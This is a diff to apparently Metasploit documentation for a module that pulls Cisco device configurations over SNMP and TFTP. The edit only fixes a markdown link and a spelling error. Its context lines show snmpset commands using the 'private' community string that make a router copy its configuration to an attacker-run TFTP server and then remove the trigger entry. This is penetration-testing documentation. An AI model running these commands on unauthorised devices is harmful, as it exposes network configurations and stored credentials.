@@ -49,7 +49,7 @@ msf5 auxiliary(scanner/snmp/cisco_config_tftp) > run
 
 ### Manual Interaction
 This process can also be executed manually utilizing Metasploit's TFTP server.
-Cisco's (documentation)[https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup]
+Cisco's [documentation](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup)
 was utilized to create this process.
 
 1. Start the TFTP server
@@ -93,7 +93,7 @@ msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.9
 iso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 1
 ```
 
-3. At this point the config is transfering, we need to wait a few seconds.  Lastly, we'll remove `666` from the system.
+3. At this point the config is transferring, we need to wait a few seconds.  Lastly, we'll remove `666` from the system.
 
 ```
 msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6
